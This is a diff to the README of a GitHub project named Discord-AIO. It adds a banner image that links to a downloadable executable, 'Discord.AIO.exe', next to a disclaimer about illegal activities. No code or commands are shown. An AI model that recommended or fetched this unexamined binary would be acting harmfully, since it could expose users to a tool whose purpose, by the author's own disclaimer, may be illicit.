@@ -29,6 +29,10 @@ I will not be held accountable for any illegal activities.
 [FAQ](https://github.com/Nyxonn/Discord-AIO/blob/main/README.md#faq)<br/>
 [Showcase](https://github.com/Nyxonn/Discord-AIO/blob/main/README.md#showcase)<br/>
 [Credits](https://github.com/Nyxonn/Discord-AIO/blob/main/README.md#credits)<br/>
+  
+<a href="https://github.com/Nyxonn/Discord-AIO/releases/download/0.7.0/Discord.AIO.exe">
+  <img src="https://user-images.githubusercontent.com/45857590/159923803-401ed8b8-44f6-4553-8d8f-ee5d2522353f.png" width="600" height="240" />
+</a>
 
 ## Features of Discord AIO
 
